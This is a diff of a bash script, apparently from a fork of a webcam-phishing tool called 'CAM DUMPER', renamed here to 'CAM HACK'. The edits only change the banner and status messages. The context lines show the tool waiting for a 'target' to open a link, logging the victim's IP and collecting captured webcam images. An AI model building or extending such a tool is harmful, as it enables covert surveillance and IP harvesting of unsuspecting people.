@@ -33,7 +33,7 @@ printf "                 [|]          \n"
 printf "              \_______/       \n"
 printf "               v     v        \n"
 printf "                ^___^         \n"
-printf "\e[1;92m   𝗖𝗔𝗠 𝗗𝗨𝗠𝗣𝗘𝗥      \e[0m\n"
+printf "\e[1;92m    𝗖𝗔𝗠 HACK      \e[0m\n"
 
 
 printf " \e[1;77m tool created by KOMIK3R ,LiNuX-Mallu\e[0m \n"
@@ -86,12 +86,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets User Open Link....\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] This Target User Opened the link!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -100,7 +100,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Images File Received!\e[0m\n"
 mv *.png captured_files/new > dev\null 2>&1 || true
 rm -rf Log.log
 fi
